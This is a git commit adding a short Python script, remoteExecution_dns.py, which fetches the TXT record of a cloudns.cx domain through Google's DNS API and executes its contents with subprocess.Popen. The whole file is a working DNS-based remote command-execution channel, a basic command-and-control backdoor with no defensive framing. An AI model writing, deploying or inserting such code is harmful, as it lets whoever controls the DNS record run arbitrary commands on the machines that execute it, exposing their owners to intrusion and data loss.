0cad4bac1190179253974f470344fb44299e6469
mySLCodeSafe <shamilakhani@me.com>
2017-11-15 08:28:29 +0000

    Add files via upload

---
+++ remoteExecution_dns.py
@@ -0,0 +1,20 @@
+#! /usr/bin/python
+# Author: ShamiLakhani@hotmail.com
+# Version:  0.1 - Draft.
+# Objective: Reads and executes a command set in a text record of a domain. 
+# Uses Google DNS API to query the domain and read the reord.
+
+import requests, json
+domain = "remotecommand.remotecontrol.cloudns.cx"
+page = requests.get ("https://dns.google.com/resolve?name="+ domain + "&type=TXT&cd=1")
+
+if page.status_code == 200:
+    j = json.loads (page.content)
+    executeCommand = (j['Answer'][0]['data'])
+    from subprocess import Popen
+    #Debug: print (executeCommand)
+    Popen (executeCommand) 
+    exit()
+else:
+    print (page.status_code)
+    exit()
